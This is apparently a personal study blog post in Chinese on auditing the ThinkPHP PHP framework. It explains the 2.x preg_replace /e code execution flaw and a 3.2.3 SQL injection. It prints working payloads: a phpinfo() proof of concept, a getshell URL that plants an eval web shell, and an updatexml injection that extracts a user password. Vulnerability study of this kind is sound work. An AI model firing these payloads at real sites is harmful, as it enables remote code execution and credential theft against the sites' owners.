---
title: thinkphp框架
id: thinkphp框架
---

<!-- more -->

太久没学习了。。就打算学习一下thinkphp这个框架，简单跟着人家审计一下







# ThinkPHP 2.x 任意代码执行漏洞



- php版本<=5.6.29

- 成因是preg_replace()使用了修饰符/e匹配路由，导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。

  ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。
  
  ```php
  #./ThinkPHP/Lib/Think/Util/Dispatcher.class.php:102: 
  $res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
  ```
  

具体分析：

[ThinkPHP系列漏洞之ThinkPHP 2.x 任意代码执行 - FreeBuf网络安全行业门户](https://www.freebuf.com/sectool/223149.html)

[preg_replace的/e修饰符妙用与慎用 - WiFeng的博客 (521-wf.com)](https://521-wf.com/archives/45.html)

[PHP-Audit-Labs/README.md at master · hongriSec/PHP-Audit-Labs (github.com)](https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day8/files/README.md)

payload：

```
/index.php?s=/index/index/name/${phpinfo()}
```

getshell：

```
/index.php?s=/index/index/name/${eval($_REQUEST[8])}&&8=phpinfo();
```





# Thinkphp3

[ThinkPHP3.2.3完全开发手册](https://www.kancloud.cn/manual/thinkphp/1678)

> thinkphp3版本路由格式:
>
> ```
> http://serverName/index.php/模块/控制器/方法/参数
> ```

[ThinkPHP3.2.3SQL注入分析 - Pan3a - 博客园 (cnblogs.com)](https://www.cnblogs.com/Pan3a/p/14873308.html)

## Thinkphp3.2.3 SQL注入

### where

payload:

```
?id[where]=1 and 1=updatexml(1,concat(0x7e,(select password from users limit 1),0x7e),1)%23
```













